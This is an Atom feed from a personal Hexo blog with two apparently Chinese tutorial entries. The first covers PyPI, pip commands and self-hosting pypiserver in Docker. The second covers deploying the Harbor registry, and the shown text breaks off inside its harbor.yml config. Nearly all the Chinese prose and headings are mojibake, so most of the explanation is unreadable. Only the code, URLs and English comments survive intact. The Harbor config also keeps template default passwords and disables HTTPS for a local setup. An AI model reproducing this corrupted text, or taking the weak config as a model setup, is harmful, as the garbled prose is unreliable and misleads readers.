<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é›²æµã®Lowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2026-02-10T09:10:57.219Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pypi</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/02/09/Pypi/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/02/09/Pypi/</id>
    <published>2026-02-09T10:05:33.000Z</published>
    <updated>2026-02-10T09:10:57.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://pypi.org/">https://pypi.org/</a></p><p><a href="https://zhuanlan.zhihu.com/p/704988918">https://zhuanlan.zhihu.com/p/704988918</a></p><p><a href="https://www.cnblogs.com/aozhejin/p/19255701">https://www.cnblogs.com/aozhejin/p/19255701</a></p><p><a href="https://www.trae.cn/article/660503298">https://www.trae.cn/article/660503298</a></p><span id="more"></span><hr><h1 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h1><p><code>Python Package Index</code>ï¼ˆPyPIï¼‰æ˜¯ Python ç¼–ç¨‹è¯­è¨€çš„ä¸»è¦è½¯ä»¶åŒ…ç´¢å¼•å’Œåˆ†å‘å¹³å°ã€‚å®ƒæ˜¯ä¸€ä¸ªé›†ä¸­çš„å­˜å‚¨åº“ï¼Œä¾›å¼€å‘è€…å’Œç”¨æˆ·æŸ¥æ‰¾ã€åˆ†äº«å’Œå®‰è£… Python è½¯ä»¶åŒ…ã€‚</p><p>åŠŸèƒ½ä¸ç‰¹ç‚¹ï¼š</p><ul><li>åŒ…çš„æ‰˜ç®¡ä¸å‘å¸ƒï¼šå¼€å‘è€…å¯ä»¥å°†ä»–ä»¬å¼€å‘çš„ Python åŒ…ä¸Šä¼ åˆ° PyPIï¼Œä¾›å…¨çƒçš„ Python ç¤¾åŒºä¸‹è½½å’Œä½¿ç”¨ã€‚è¿™ä¸ªè¿‡ç¨‹é€šè¿‡ <code>setuptools</code> å’Œ <code>twine</code> ç­‰å·¥å…·å®ç°ï¼Œå…¶ä¸­ twine è´Ÿè´£å°†æ„å»ºå¥½çš„åŒ…ä¸Šä¼ åˆ° PyPIã€‚</li><li>åŒ…çš„æœç´¢ä¸æµè§ˆï¼šPyPI æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„æœç´¢å¼•æ“ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å…³é”®è¯ã€åŒ…åæˆ–ä½œè€…åæ¥æŸ¥æ‰¾æ„Ÿå…´è¶£çš„è½¯ä»¶åŒ…ã€‚æ¯ä¸ªåŒ…éƒ½æœ‰è¯¦ç»†çš„æè¿°ã€ç‰ˆæœ¬å†å²å’Œæ–‡æ¡£é“¾æ¥ï¼Œå¸®åŠ©ç”¨æˆ·äº†è§£å’Œé€‰æ‹©é€‚åˆçš„åŒ…ã€‚</li><li>ç‰ˆæœ¬æ§åˆ¶ä¸ä¾èµ–ç®¡ç†ï¼šPyPI å¯¹åŒ…çš„ç‰ˆæœ¬è¿›è¡Œäº†æœ‰æ•ˆç®¡ç†ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€æ±‚é€‰æ‹©ç‰¹å®šçš„ç‰ˆæœ¬è¿›è¡Œå®‰è£…ã€‚åŒæ—¶ï¼ŒPyPI è¿˜å¤„ç†äº†åŒ…çš„ä¾èµ–å…³ç³»ï¼Œç¡®ä¿å®‰è£…æ—¶èƒ½æ­£ç¡®åœ°è§£å†³ä¾èµ–å’Œç‰ˆæœ¬å†²çªã€‚</li><li>ç¤¾åŒºä¸è´¡çŒ®ï¼šPyPI ä½œä¸º Python ç¤¾åŒºçš„ä¸­å¿ƒå¹³å°ï¼Œé¼“åŠ±å¼€å‘è€…å’Œç”¨æˆ·å‚ä¸åˆ°åŒ…çš„è´¡çŒ®å’Œæ”¹è¿›ä¸­æ¥ã€‚å¼€æºç¤¾åŒºçš„ç‰¹æ€§ä½¿å¾—æ¯ä¸ªäººéƒ½èƒ½ä¸º PyPI ä¸Šçš„åŒ…æä¾›åé¦ˆã€æŠ¥å‘Šé—®é¢˜æˆ–è´¡çŒ®ä»£ç ã€‚</li></ul><p>åŒ…çš„å®‰å…¨éªŒè¯ï¼š</p><ol><li><strong>åŒ…ç­¾åéªŒè¯</strong>ï¼šæ”¯æŒ GPG ç­¾åéªŒè¯åŒ…çš„å®Œæ•´æ€§</li><li><strong>åŒå› ç´ è®¤è¯</strong>ï¼šä¿æŠ¤å¼€å‘è€…è´¦å·å®‰å…¨</li><li><strong>æ¶æ„ä»£ç æ‰«æ</strong>ï¼šè‡ªåŠ¨æ£€æµ‹å·²çŸ¥çš„æ¶æ„æ¨¡å¼</li><li><strong>å‘½åç©ºé—´ä¿æŠ¤</strong>ï¼šé˜²æ­¢åŒ…åæŠ¢æ³¨å’Œæ··æ·†æ”»å‡»</li></ol><p>å¯ä»¥ä½¿ç”¨ <code>pip-audit</code> æ¥æ£€æŸ¥å·²å®‰è£…åŒ…çš„å®‰å…¨æ¼æ´</p><hr><h1 id="ç›¸å…³å‘½ä»¤"><a href="#ç›¸å…³å‘½ä»¤" class="headerlink" title="ç›¸å…³å‘½ä»¤"></a>ç›¸å…³å‘½ä»¤</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> requests<span class="token comment"># å®‰è£… requests åŒ…</span>pip <span class="token function">install</span> <span class="token assign-left variable">django</span><span class="token operator">==</span><span class="token number">4.2</span>.0<span class="token comment"># å®‰è£…ç‰¹å®šç‰ˆæœ¬</span>pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt<span class="token comment"># ä» requirements.txt æ‰¹é‡å®‰è£…</span>pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> package-namepip uninstall package-namepip listpip show package-namepip freeze <span class="token operator">></span> requirements.txt <span class="token comment"># å¯¼å‡ºä¾èµ–åˆ—è¡¨</span>pip search numpy<span class="token comment"># æŸ¥æ‰¾ numpy åŒ…ï¼ˆæ­¤åŠŸèƒ½å·²è¢«å¼ƒç”¨ï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„å»ºè‡ªå·±çš„åŒ…å¹¶å‘å¸ƒï¼š</p><p>ä½¿ç”¨ setuptools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python setup.py sdisttwine upload dist/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ twine buildï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. å®‰è£…å‘å¸ƒå·¥å…·</span>pip <span class="token function">install</span> twine build <span class="token comment"># 2. æ„å»ºåˆ†å‘åŒ…</span>python <span class="token parameter variable">-m</span> build <span class="token comment"># 3. æ£€æŸ¥åŒ…çš„å®Œæ•´æ€§</span>twine check dist/* <span class="token comment"># 4. ä¸Šä¼ åˆ° PyPIï¼ˆéœ€è¦æ³¨å†Œè´¦å·ï¼‰</span>twine upload dist/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¡¹ç›®ç»“æ„ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">my_package/â”œâ”€â”€ src/â”‚   â””â”€â”€ my_package/â”‚       â”œâ”€â”€ __init__.pyâ”‚       â””â”€â”€ main.pyâ”œâ”€â”€ tests/â”‚   â””â”€â”€ test_main.pyâ”œâ”€â”€ setup.pyâ”œâ”€â”€ README.mdâ””â”€â”€ LICENSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="é•œåƒæº"><a href="#é•œåƒæº" class="headerlink" title="é•œåƒæº"></a>é•œåƒæº</h1><p>å¸¸ç”¨çš„å›½å†…é•œåƒæºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://pypi.tuna.tsinghua.edu.cn/simplehttps://mirrors.aliyun.com/pypi/simplehttps://pypi.douban.com/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¸´æ—¶ä½¿ç”¨æ¸…åé•œåƒ</span>pip <span class="token function">install</span> <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple package-name <span class="token comment"># æ°¸ä¹…é…ç½®é•œåƒæº</span>pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="è‡ªå»º-pypi"><a href="#è‡ªå»º-pypi" class="headerlink" title="è‡ªå»º pypi"></a>è‡ªå»º pypi</h1><h2 id="pypiserver"><a href="#pypiserver" class="headerlink" title="pypiserver"></a>pypiserver</h2><p>pypiserver æ˜¯ä¸€ä¸ªæç®€çš„ PyPI å…¼å®¹æœåŠ¡å™¨ï¼Œæ”¯æŒ pip æˆ– easy_install</p><p>è¿™é‡Œé€‰æ‹©åœ¨ docker ä¸Šè¿›è¡Œæ„å»º</p><p>docker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3.7'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">pypi-server</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> pypiserver/pypiserver<span class="token punctuation">:</span>latest    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 8080<span class="token punctuation">:</span><span class="token number">8080</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> volume        <span class="token key atrule">source</span><span class="token punctuation">:</span> pypi<span class="token punctuation">-</span>server        <span class="token key atrule">target</span><span class="token punctuation">:</span> /data/packages    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>P . <span class="token punctuation">-</span>a . /data/packages    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always<span class="token key atrule">volumes</span><span class="token punctuation">:</span>  pypi<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—® localhost:8080</p><p><img src="/blog/2026/02/09/Pypi/IMG-20260210165813713.png"></p><p>æ¥ä¸‹æ¥åˆ›å»ºä¸€ä¸ªé¡¹ç›®è¿›è¡Œæµ‹è¯•ï¼Œé¡¹ç›®ç»“æ„ä»¿ç…§ä¸Šé¢æè¿‡çš„æ ·å¼</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hellopypiâ”œâ”€â”€ setup.pyâ””â”€â”€ src    â””â”€â”€ hellopypi        â”œâ”€â”€ __init__.py        â””â”€â”€ main.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>setup.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> setuptools <span class="token keyword">import</span> setup<span class="token punctuation">,</span> find_packagessetup<span class="token punctuation">(</span>    name<span class="token operator">=</span><span class="token string">'hellopypi'</span><span class="token punctuation">,</span>  <span class="token comment">#åº”ç”¨å</span>    package_dir<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">:</span> <span class="token string">"src"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    author<span class="token operator">=</span><span class="token string">'0w0'</span><span class="token punctuation">,</span>  <span class="token comment">#ä½œè€…</span>    version<span class="token operator">=</span><span class="token string">'1.0'</span><span class="token punctuation">,</span>  <span class="token comment">#ç‰ˆæœ¬å·</span>    description<span class="token operator">=</span><span class="token string">"è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•æ¨¡å—"</span><span class="token punctuation">,</span>    author_email<span class="token operator">=</span><span class="token string">"1@1.com"</span><span class="token punctuation">,</span>    packages<span class="token operator">=</span>find_packages<span class="token punctuation">(</span>where<span class="token operator">=</span><span class="token string">"src"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">#åŒ…æ‹¬åœ¨å®‰è£…åŒ…å†…çš„PythonåŒ…</span>    include_package_data<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>  <span class="token comment">#å¯ç”¨æ¸…å•æ–‡ä»¶MANIFEST.in,åŒ…å«æ•°æ®æ–‡ä»¶</span>    <span class="token comment">#æ’é™¤æ–‡ä»¶</span>    exclude_package_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'docs'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'hellopypi.txt'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">#è‡ªåŠ¨å®‰è£…ä¾èµ–</span>    install_requires<span class="token operator">=</span><span class="token punctuation">[</span>        <span class="token string">'Flask>=0.10'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    entry_points<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"console_scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token string">"hellopypi=hellopypi.main:main"</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ‰“åŒ…ï¼Œç”Ÿæˆåˆ†å‘åŒ…</p><p><img src="/blog/2026/02/09/Pypi/IMG-20260210170840967.png"></p><p>æŠŠè¿™ä¸ª tar.gz åŒ…æ”¾åˆ°å®¹å™¨å†…çš„ &#x2F;data&#x2F;packages ç›®å½•ä¸‹</p><p><img src="/blog/2026/02/09/Pypi/IMG-20260210171012893.png"></p><p>æ­¤æ—¶å°±ä¸Šä¼ æˆåŠŸäº†</p><p>å¦‚æœè¦ pip ä¸‹è½½çš„è¯å°±</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">pip3 install http:&#x2F;&#x2F;localhost:8080&#x2F;packages&#x2F;hellopypi-1.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pypi.org/&quot;&gt;https://pypi.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/704988918&quot;&gt;https://zhuanlan.zhihu.com/p/704988918&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/aozhejin/p/19255701&quot;&gt;https://www.cnblogs.com/aozhejin/p/19255701&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.trae.cn/article/660503298&quot;&gt;https://www.trae.cn/article/660503298&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Dev" scheme="http://c1oudfl0w0.github.io/blog/categories/Dev/"/>
    
    
  </entry>
  
  <entry>
    <title>Harbor</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/02/09/Harbor/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/02/09/Harbor/</id>
    <published>2026-02-09T10:05:23.000Z</published>
    <updated>2026-02-10T08:15:15.257Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/sowler/p/18242819">https://www.cnblogs.com/sowler/p/18242819</a></p><p><a href="https://github.com/gm19900510/Harbor_Install">https://github.com/gm19900510/Harbor_Install</a></p><span id="more"></span><hr><h1 id="Docker-ç§æœ‰ä»“åº“"><a href="#Docker-ç§æœ‰ä»“åº“" class="headerlink" title="Docker ç§æœ‰ä»“åº“"></a>Docker ç§æœ‰ä»“åº“</h1><p>Docker é»˜è®¤çš„é•œåƒæºæ˜¯ DockerHubï¼Œè€Œä¸ DockerHub ä¸åŒï¼Œç§æœ‰ä»“åº“æ˜¯å—é™è®¿é—®çš„ï¼Œåªæœ‰æˆæƒç”¨æˆ·æ‰èƒ½å¤Ÿä¸Šä¼ ã€ä¸‹è½½å’Œç®¡ç†å…¶ä¸­çš„é•œåƒã€‚è¿™ç§ç§æœ‰ä»“åº“å¯ä»¥éƒ¨ç½²åœ¨æœ¬åœ°äº‘ç¯å¢ƒä¸­ï¼Œç”¨äºç»„ç»‡å†…éƒ¨å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒä¸­çš„å®¹å™¨é•œåƒç®¡ç†ï¼Œä¿è¯æ•°æ®å®‰å…¨æ€§ã€‚</p><p>å¸¸è§çš„ Docker ç§æœ‰ä»“åº“æœ‰ï¼šHarborã€Docker Trusted Registry (DTR)ã€Portusã€Nexus Repository Managerã€GitLab Container Registryã€AWS Elastic Container Registry (ECR)</p><hr><h1 id="Harbor"><a href="#Harbor" class="headerlink" title="Harbor"></a>Harbor</h1><p>Harbor æ˜¯ç”± VMware å…¬å¸å¼€æºçš„ä¼ä¸šçº§çš„ Docker Registry ç®¡ç†é¡¹ç›®ï¼Œç›¸æ¯” Docker å®˜æ–¹æ‹¥æœ‰æ›´ä¸°å¯Œçš„æƒé™æƒåˆ©å’Œå®Œå–„çš„æ¶æ„è®¾è®¡ï¼Œé€‚ç”¨å¤§è§„æ¨¡ docker é›†ç¾¤éƒ¨ç½²æä¾›ä»“åº“æœåŠ¡ã€‚</p><p>å®ƒä¸»è¦æä¾› Dcoker Registry ç®¡ç†ç•Œé¢ UIï¼Œå¯åŸºäºè§’è‰²è®¿é—®æ§åˆ¶ï¼Œé•œåƒå¤åˆ¶ï¼ŒAD&#x2F;LDAP é›†æˆï¼Œæ—¥å¿—å®¡æ ¸ç­‰åŠŸèƒ½ï¼Œå®Œå…¨çš„æ”¯æŒä¸­æ–‡ã€‚</p><p>ä¸»è¦åŠŸèƒ½ï¼š</p><ul><li>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼šç”¨æˆ·ä¸ Docker é•œåƒä»“åº“é€šè¿‡â€œé¡¹ç›®â€è¿›è¡Œç»„ç»‡ç®¡ç†ï¼Œä¸€ä¸ªç”¨æˆ·å¯ä»¥å¯¹å¤šä¸ªé•œåƒä»“åº“åœ¨åŒä¸€å‘½åç©ºé—´ï¼ˆprojectï¼‰é‡Œæœ‰ä¸åŒçš„æƒé™ã€‚</li><li>åŸºäºé•œåƒçš„å¤åˆ¶ç­–ç•¥ï¼šé•œåƒå¯ä»¥åœ¨å¤šä¸ª Registry å®ä¾‹ä¸­å¤åˆ¶ï¼ˆå¯ä»¥å°†ä»“åº“ä¸­çš„é•œåƒåŒæ­¥åˆ°è¿œç¨‹çš„ Harborï¼Œç±»ä¼¼äº MySQL ä¸»ä»åŒæ­¥åŠŸèƒ½ï¼‰ï¼Œå°¤å…¶é€‚åˆäºè´Ÿè½½å‡è¡¡ï¼Œé«˜å¯ç”¨ï¼Œæ··åˆäº‘å’Œå¤šäº‘çš„åœºæ™¯ã€‚</li><li>å›¾å½¢åŒ–ç”¨æˆ·ç•Œé¢ï¼šç”¨æˆ·å¯ä»¥é€šè¿‡æµè§ˆå™¨æ¥æµè§ˆï¼Œæ£€ç´¢å½“å‰Dockeré•œåƒä»“åº“ï¼Œç®¡ç†é¡¹ç›®å’Œå‘½åç©ºé—´ã€‚</li><li>æ”¯æŒ AD&#x2F;LDAPï¼šHarborå¯ä»¥é›†æˆä¼ä¸šå†…éƒ¨å·²æœ‰çš„AD&#x2F;LDAPï¼Œç”¨äºé‰´æƒè®¤è¯ç®¡ç†ã€‚</li><li>é•œåƒåˆ é™¤å’Œåƒåœ¾å›æ”¶ï¼šHarboræ”¯æŒåœ¨Webåˆ é™¤é•œåƒï¼Œå›æ”¶æ— ç”¨çš„é•œåƒï¼Œé‡Šæ”¾ç£ç›˜ç©ºé—´ã€‚imageå¯ä»¥è¢«åˆ é™¤å¹¶ä¸”å›æ”¶imageå ç”¨çš„ç©ºé—´ã€‚</li><li>å®¡è®¡ç®¡ç†ï¼šæ‰€æœ‰é’ˆå¯¹é•œåƒä»“åº“çš„æ“ä½œéƒ½å¯ä»¥è¢«è®°å½•è¿½æº¯ï¼Œç”¨äºå®¡è®¡ç®¡ç†ã€‚</li><li>RESTful APIï¼šRESTful API æä¾›ç»™ç®¡ç†å‘˜å¯¹äºHarboræ›´å¤šçš„æ“æ§, ä½¿å¾—ä¸å…¶å®ƒç®¡ç†è½¯ä»¶é›†æˆå˜å¾—æ›´å®¹æ˜“ã€‚</li><li>éƒ¨ç½²ç®€å•ï¼šæä¾›åœ¨çº¿å’Œç¦»çº¿ä¸¤ç§å®‰è£…å·¥å…·ï¼Œä¹Ÿå¯ä»¥å®‰è£…åˆ°vSphereå¹³å°(OVAæ–¹å¼)è™šæ‹Ÿè®¾å¤‡ã€‚ Harbor çš„æ‰€æœ‰ç»„ä»¶éƒ½åœ¨ Docker ä¸­éƒ¨ç½²ï¼Œæ‰€ä»¥ Harbor å¯ä½¿ç”¨ Docker Compose å¿«é€Ÿéƒ¨ç½²ã€‚</li></ul><p>æ¶æ„ï¼š</p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210105504457.png"></p><p>Registryï¼šè´Ÿè´£å­˜å‚¨ docker é•œåƒï¼Œå¤„ç†ä¸Šä¼ &#x2F;ä¸‹è½½å‘½ä»¤ã€‚å¯¹ç”¨æˆ·è¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª token æœåŠ¡ï¼Œå¼ºåˆ¶ç”¨æˆ·çš„æ¯æ¬¡ docker pull&#x2F;push è¯·æ±‚éƒ½è¦æºå¸¦ä¸€ä¸ªåˆæ³•çš„ tokenï¼Œregistry ä¼šé€šè¿‡å…¬é’¥å¯¹  token è¿›è¡Œè§£å¯†éªŒè¯</p><p>Core serviceï¼šæ ¸å¿ƒåŠŸèƒ½</p><ul><li>UIï¼šå›¾å½¢ç•Œé¢</li><li>Webhookï¼šåŠæ—¶è·å– registry ä¸Š image çŠ¶æ€å˜åŒ–æƒ…å†µï¼Œåœ¨ registry ä¸Šé…ç½® webhookï¼ŒæŠŠçŠ¶æ€å˜åŒ–ä¼ é€’ç»™ UI æ¨¡å—</li><li>Token æœåŠ¡ï¼šå¤æ‚æ ¹æ®ç”¨æˆ·æƒé™ç»™æ¯ä¸ª docker pull&#x2F;push å‘½ä»¤ç­¾å‘ tokenã€‚Docker å®¢æˆ·ç«¯å‘ registry æœåŠ¡å‘èµ·çš„è¯·æ±‚ï¼Œå¦‚æœä¸åŒ…å« tokenï¼Œä¼šè¢«é‡å®šå‘åˆ°è¿™é‡Œï¼Œè·å¾— token åå†é‡æ–°å‘ registry è¿›è¡Œè¯·æ±‚</li></ul><hr><h1 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h1><p>å®¿ä¸»æœºç¯å¢ƒæ˜¯ Mac</p><p>ç›´æ¥ç”¨ç¦»çº¿å®‰è£…çš„æ–¹å¼éƒ¨ç½²ï¼Œä¸‹è½½ç¦»çº¿åŒ…ï¼ˆè¿™é‡Œä¸‹è½½çš„æ˜¯ amd64 æ¶æ„ï¼Œä¸è¿‡æœ‰ rosetta åœ¨é—®é¢˜ä¸å¤§ï¼‰ï¼š <a href="https://github.com/goharbor/harbor/releases">https://github.com/goharbor/harbor/releases</a></p><p>æ­¤æ—¶æœ€æ–°ç‰ˆæœ¬æ˜¯ 2.14.2</p><p><img src="/blog/2026/02/09/Harbor/IMG-20260210114109332.png"></p><p>ä¿®æ”¹é…ç½®æ–‡ä»¶</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">cp harbor.yml.tmpl  harbor.ymlmkdir -p opt     # ç”¨äºå­˜æ”¾harborçš„æŒä¹…åŒ–æ•°æ®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>harbor.yml ä¸»è¦ä¿®æ”¹çš„å†…å®¹ï¼šè·¯å¾„æ˜ å°„ï¼ŒipåŸŸåï¼Œå…³é—­ https</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># The IP address or hostname to access admin UI and registry service.</span><span class="token comment"># DO NOT use localhost or 127.0.0.1, because Harbor needs to be accessed by external clients.</span><span class="token key atrule">hostname</span><span class="token punctuation">:</span> 192.168.77.94<span class="token comment"># http related config</span><span class="token key atrule">http</span><span class="token punctuation">:</span>  <span class="token comment"># port for http, default is 80. If https enabled, this port will redirect to https port</span>  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8999</span>  <span class="token comment"># https related config</span><span class="token comment"># https:</span><span class="token comment">#   # https port for harbor, default is 443</span><span class="token comment">#   port: 443</span><span class="token comment">#   # The path of cert and key files for nginx</span><span class="token comment">#   certificate: /your/certificate/path</span><span class="token comment">#   private_key: /your/private/key/path</span><span class="token comment">#   # enable strong ssl ciphers (default: false)</span><span class="token comment">#   # strong_ssl_ciphers: false</span>  <span class="token comment"># The initial password of Harbor admin</span><span class="token comment"># It only works in first time to install harbor</span><span class="token comment"># Remember Change the admin password from UI after launching Harbor.</span><span class="token key atrule">harbor_admin_password</span><span class="token punctuation">:</span> Harbor12345<span class="token comment"># Harbor DB configuration</span><span class="token key atrule">database</span><span class="token punctuation">:</span>  <span class="token comment"># The password for the user('postgres' by default) of Harbor DB. Change this before any production use.</span>  <span class="token key atrule">password</span><span class="token punctuation">:</span> root123  <span class="token comment"># The maximum number of connections in the idle connection pool. If it &lt;=0, no idle connections are retained.</span>  <span class="token key atrule">max_idle_conns</span><span class="token punctuation">:</span> <span class="token number">100</span>  <span class="token comment"># The maximum number of open connections to the database. If it &lt;= 0, then there is no limit on the number of open connections.</span>  <span class="token comment"># Note: the default number of connections is 1024 for postgres of harbor.</span>  <span class="token key atrule">max_open_conns</span><span class="token punctuation">:</span> <span class="token number">900</span>  <span class="token comment"># The maximum amount of time a connection may be reused. Expired connections may be closed lazily before reuse. If it &lt;= 0, connections are not closed due to a connection's age.</span>  <span class="token comment"># The value is a duration string. A duration string is a possibly signed sequence of decimal numbers, each with optional fraction and a unit suffix, such as "300ms", "-1.5h" or "2h45m". Valid time units are "ns", "us" (or "Âµs"), "ms", "s", "m", "h".</span>  <span class="token key atrule">conn_max_lifetime</span><span class="token punctuation">:</span> 5m  <span class="token comment"># The maximum amount of time a connection may be idle. Expired connections may be closed lazily before reuse. If it &lt;= 0, connections are not closed due to a connection's idle time.</span>  <span class="token comment"># The value is a duration string. A duration string is a possibly signed sequence of decimal numbers, each with optional fraction and a unit suffix, such as "300ms", "-1.5h" or "2h45m". Valid time units are "ns", "us" (or "Âµs"), "ms", "s", "m", "h".</span>  <span class="token key atrule">conn_max_idle_time</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token comment"># The default data volume</span><span class="token key atrule">data_volume</span><span class="token punctuation">:</span> ~/DevOps/Harbor/opt<span class="token comment"># Log configurations</span><span class="token key atrule">log</span><span class="token punctuation">:</span>  <span class="token comment"># options are debug, info, warning, error, fatal</span>  <span class="token key atrule">level</span><span class="token punctuation">:</span> info  <span class="token comment"># configs for logs in local storage</span>  <span class="token key atrule">local</span><span class="token punctuation">:</span>    <span class="token comment"># Log files are rotated log_rotate_count times before being removed. If count is 0, old versions are removed rather than rotated.</span>    <span class="token key atrule">rotate_count</span><span class="token punctuation">:</span> <span class="token number">50</span>    <span class="token comment"># Log files are rotated only if they grow bigger than log_rotate_size bytes. If size is followed by k, the size is assumed to be in kilobytes.</span>    <span class="token comment"># If the M is used, the size is in megabytes, and if G is used, the size is in gigabytes. So size 100, size 100k, size 100M and size 100G</span>    <span class="token comment"># are all valid.</span>    <span class="token key atrule">rotate_size</span><span class="token punctuation">:</span> 200M    <span class="token comment"># The directory on your host that store log</span>    <span class="token key atrule">location</span><span class="token punctuation">:</span> ~/DevOps/Harbor/log<span aria-hidden="true" 